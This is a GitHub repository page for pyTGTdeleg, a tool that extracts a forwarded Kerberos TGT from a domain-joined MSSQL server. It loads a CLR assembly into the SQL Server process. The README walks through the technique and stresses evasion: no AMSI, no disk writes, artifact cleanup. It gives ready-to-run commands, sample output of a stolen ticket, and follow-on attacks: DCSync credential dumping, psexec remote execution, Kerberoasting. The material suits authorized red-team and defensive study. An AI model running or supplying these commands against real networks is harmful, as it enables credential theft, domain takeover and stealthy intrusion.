# https://github.com/ivancabrera02/pyTGTdeleg

[Skip to content](https://github.com/ivancabrera02/pyTGTdeleg#start-of-content)

You signed in with another tab or window. [Reload](https://github.com/ivancabrera02/pyTGTdeleg) to refresh your session.You signed out in another tab or window. [Reload](https://github.com/ivancabrera02/pyTGTdeleg) to refresh your session.You switched accounts on another tab or window. [Reload](https://github.com/ivancabrera02/pyTGTdeleg) to refresh your session.Dismiss alert

{{ message }}

[ivancabrera02](https://github.com/ivancabrera02)/ **[pyTGTdeleg](https://github.com/ivancabrera02/pyTGTdeleg)** Public

- [Notifications](https://github.com/login?return_to=%2Fivancabrera02%2FpyTGTdeleg) You must be signed in to change notification settings
- [Fork\\
4](https://github.com/login?return_to=%2Fivancabrera02%2FpyTGTdeleg)
- [Star\\
39](https://github.com/login?return_to=%2Fivancabrera02%2FpyTGTdeleg)


main

[**1** Branch](https://github.com/ivancabrera02/pyTGTdeleg/branches) [**0** Tags](https://github.com/ivancabrera02/pyTGTdeleg/tags)

[Go to Branches page](https://github.com/ivancabrera02/pyTGTdeleg/branches)[Go to Tags page](https://github.com/ivancabrera02/pyTGTdeleg/tags)

Go to file

Code

Open more actions menu

## Folders and files

| Name | Name | Last commit message | Last commit date |
| --- | --- | --- | --- |
| ## Latest commit<br>[![ivancabrera02](https://avatars.githubusercontent.com/u/103500562?v=4&size=40)](https://github.com/ivancabrera02)[ivancabrera02](https://github.com/ivancabrera02/pyTGTdeleg/commits?author=ivancabrera02)<br>[Add files via upload](https://github.com/ivancabrera02/pyTGTdeleg/commit/9fa4cdc68a4ec6c0ec401b8f10fc862930e48ed9)<br>4 days agoAug 5, 2026<br>[9fa4cdc](https://github.com/ivancabrera02/pyTGTdeleg/commit/9fa4cdc68a4ec6c0ec401b8f10fc862930e48ed9) · 4 days agoAug 5, 2026<br>## History<br>[2 Commits](https://github.com/ivancabrera02/pyTGTdeleg/commits/main/) <br>Open commit details<br>[View commit history for this file.](https://github.com/ivancabrera02/pyTGTdeleg/commits/main/) 2 Commits |
| [README.md](https://github.com/ivancabrera02/pyTGTdeleg/blob/main/README.md "README.md") | [README.md](https://github.com/ivancabrera02/pyTGTdeleg/blob/main/README.md "README.md") | [Create README.md](https://github.com/ivancabrera02/pyTGTdeleg/commit/d81b511b931e867bbff20f2b1297788f9421a573 "Create README.md") | 4 days agoAug 5, 2026 |
| [mssql\_tgtdeleg\_clr.py](https://github.com/ivancabrera02/pyTGTdeleg/blob/main/mssql_tgtdeleg_clr.py "mssql_tgtdeleg_clr.py") | [mssql\_tgtdeleg\_clr.py](https://github.com/ivancabrera02/pyTGTdeleg/blob/main/mssql_tgtdeleg_clr.py "mssql_tgtdeleg_clr.py") | [Add files via upload](https://github.com/ivancabrera02/pyTGTdeleg/commit/9fa4cdc68a4ec6c0ec401b8f10fc862930e48ed9 "Add files via upload") | 4 days agoAug 5, 2026 |
| View all files |

## Repository files navigation

# pyTGTdeleg

[Permalink: pyTGTdeleg](https://github.com/ivancabrera02/pyTGTdeleg#pytgtdeleg)

Remote Kerberos TGT extraction via MSSQL

## What it does

[Permalink: What it does](https://github.com/ivancabrera02/pyTGTdeleg#what-it-does)

pyTGTDeleg abuses the Kerberos delegation mechanism (tgtdeleg trick) to extract a usable forwarded TGT from a domain-joined MSSQL server, using only SA credentials. The extracted TGT is saved as a `.ccache` file compatible with impacket and other Kerberos tooling.

The tool loads a custom CLR assembly directly into `sqlservr.exe` via SQL commands. The assembly performs SSPI delegation calls and retrieves the service ticket session key from the Kerberos ticket cache, all within the MSSQL process. No `cmd.exe`, no `powershell.exe`, no files written to disk.

## How the technique works

[Permalink: How the technique works](https://github.com/ivancabrera02/pyTGTdeleg#how-the-technique-works)

1. A CLR assembly is loaded into `sqlservr.exe` from hex bytes via `CREATE ASSEMBLY`
2. The assembly calls `AcquireCredentialsHandle` \+ `InitializeSecurityContext` with `ISC_REQ_DELEGATE`, targeting a DC with unconstrained delegation
3. SSPI internally requests a **forwarded TGT** from the KDC and packages it as a KRB-CRED inside the AP-REQ authenticator checksum
4. The assembly retrieves the service ticket session key from the local ticket cache via `LsaCallAuthenticationPackage`
5. The raw SPNEGO token and session key are returned to the Python client
6. Python parses the GSS-API token → AP-REQ → decrypts the authenticator → extracts the KRB-CRED → decrypts the forwarded TGT → saves it as a `.ccache` file
7. All SQL artifacts (procedure, assembly, configuration changes) are cleaned up automatically

## OPSEC characteristics

[Permalink: OPSEC characteristics](https://github.com/ivancabrera02/pyTGTdeleg#opsec-characteristics)

- **No child processes** → code runs inside `sqlservr.exe` via SQL CLR hosting
- **No AMSI** → CLR assemblies loaded via SQL don't pass through the AMSI pipeline
- **No disk writes** → assembly loaded from hex in a SQL query
- **Full cleanup** → drops procedure, assembly, and restores `clr enabled`, `clr strict security`, and `TRUSTWORTHY` to their original values

## Requirements

[Permalink: Requirements](https://github.com/ivancabrera02/pyTGTdeleg#requirements)

**Attacker machine (Linux/Windows/macOS):**

```
pip install impacket
```

**Target:**

- MSSQL Server with `sysadmin` credentials (typically `sa`)
- Server must be domain-joined
- The MSSQL service account must have a TGT in its Kerberos ticket cache
- The service account must NOT have the `NOT_DELEGATED` UAC flag
- The service account must NOT be a member of `Protected Users`

## Usage

[Permalink: Usage](https://github.com/ivancabrera02/pyTGTdeleg#usage)

### Basic

[Permalink: Basic](https://github.com/ivancabrera02/pyTGTdeleg#basic)

```
python3 mssql_tgtdeleg_clr.py -t <MSSQL_IP> -u sa -p '<password>' -spn HOST/<dc_fqdn>
```

### Auto-discover DC

[Permalink: Auto-discover DC](https://github.com/ivancabrera02/pyTGTdeleg#auto-discover-dc)

```
python3 mssql_tgtdeleg_clr.py -t <MSSQL_IP> -u sa -p '<password>' --auto-spn
```

### Windows authentication

[Permalink: Windows authentication](https://github.com/ivancabrera02/pyTGTdeleg#windows-authentication)

```
python3 mssql_tgtdeleg_clr.py -t <MSSQL_IP> -u 'DOMAIN\dbadmin' -p '<password>' -w -spn HOST/<dc_fqdn>
```

### Verbose output

[Permalink: Verbose output](https://github.com/ivancabrera02/pyTGTdeleg#verbose-output)

```
python3 mssql_tgtdeleg_clr.py -t <MSSQL_IP> -u sa -p '<password>' -spn HOST/<dc_fqdn> -v
```

### Full example

[Permalink: Full example](https://github.com/ivancabrera02/pyTGTdeleg#full-example)

```
python3 mssql_tgtdeleg_clr.py -t 10.10.10.5 -u sa -p 'DbP@ss!' \
    -spn HOST/dc01.corp.local -o corp_tgt.ccache
```

```
[INFO] Connecting to 10.10.10.5:1433 as sa ...
[INFO] Authenticated
[INFO] Configuring CLR support ...
[INFO] Loading CLR assembly into sqlservr.exe ...
[INFO] Executing tgtdeleg (inside sqlservr.exe) ...
[INFO] Cleaning up CLR artifacts ...
[INFO] SPNEGO token    : 3259 bytes
[INFO] Svc session key : 32 bytes (etype 18)
[INFO] Parsing SPNEGO -> AP-REQ -> Authenticator -> KRB-CRED ...
[INFO] KRB-CRED: 1449 bytes from GSS checksum
[INFO] KRB-CRED decrypted with svc session key (etype 18, usage 14)
[INFO] TGT: SVC_MSSQL$@CORP.LOCAL -> krbtgt/CORP.LOCAL@CORP.LOCAL (etype 18)

[+] Forwarded TGT extracted!
    Client   : SVC_MSSQL$@CORP.LOCAL
    Service  : krbtgt/CORP.LOCAL@CORP.LOCAL
    Key etype: 18
    Saved    : corp_tgt.ccache
```

## Using the extracted TGT

[Permalink: Using the extracted TGT](https://github.com/ivancabrera02/pyTGTdeleg#using-the-extracted-tgt)

```
export KRB5CCNAME=corp_tgt.ccache

# DCSync (if the account has replication rights)
impacket-secretsdump -k -no-pass CORP.LOCAL/SVC_MSSQL\$@dc01.corp.local

# Request a service ticket
impacket-getST -k -no-pass -spn cifs/fileserver.corp.local CORP.LOCAL/SVC_MSSQL\$

# Kerberoasting
impacket-GetUserSPNs -k -no-pass -dc-ip 10.10.10.5 -request CORP.LOCAL/SVC_MSSQL\$

# Remote execution
impacket-psexec -k -no-pass CORP.LOCAL/SVC_MSSQL\$@dc01.corp.local

# SMB enumeration
impacket-smbclient -k -no-pass CORP.LOCAL/SVC_MSSQL\$@fileserver.corp.local
```

## CLI reference

[Permalink: CLI reference](https://github.com/ivancabrera02/pyTGTdeleg#cli-reference)

| Flag | Description |
| --- | --- |
| `-t`, `--target` | MSSQL server IP or hostname (required) |
| `-u`, `--user` | MSSQL username (default: `sa`) |
| `-p`, `--password` | MSSQL password (required) |
| `--port` | MSSQL port (default: `1433`) |
| `-spn`, `--spn` | Target SPN — must point to a host with unconstrained delegation |
| `--auto-spn` | Auto-discover a domain controller SPN |
| `-o`, `--output` | Output ccache file path (default: `forwarded.ccache`) |
| `-w`, `--windows-auth` | Use Windows/NTLM authentication instead of SQL auth |
| `-v`, `--verbose` | Show debug output including decryption attempts |

## SPN selection

[Permalink: SPN selection](https://github.com/ivancabrera02/pyTGTdeleg#spn-selection)

The target SPN must belong to a machine account with **unconstrained delegation**. Domain controllers have this by default. Valid formats:

```
HOST/dc01.corp.local
cifs/dc01.corp.local
ldap/dc01.corp.local
```

The SPN is only used to trigger the delegation flow — the extracted ticket is always the `krbtgt` TGT, not a service ticket for that SPN.

## Credits

[Permalink: Credits](https://github.com/ivancabrera02/pyTGTdeleg#credits)

- Benjamin Delpy ( [@gentilkiwi](https://twitter.com/gentilkiwi)) → original tgtdeleg concept
- [Rubeus](https://github.com/GhostPack/Rubeus) → reference implementation
- [Impacket](https://github.com/fortra/impacket) → Kerberos parsing and ccache generation

## About

No description, website, or topics provided.

### Resources

[Readme](https://github.com/ivancabrera02/pyTGTdeleg#readme-ov-file)

[Activity](https://github.com/ivancabrera02/pyTGTdeleg/activity)

### Stars

**39** stars

### Watchers

**0** watching

### Forks

[**4** forks](https://github.com/ivancabrera02/pyTGTdeleg/forks)

[Report repository](https://github.com/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2Fivancabrera02%2FpyTGTdeleg&report=ivancabrera02+%28user%29)

## Releases

## Packages

## Contributors

## Languages

You can’t perform that action at this time.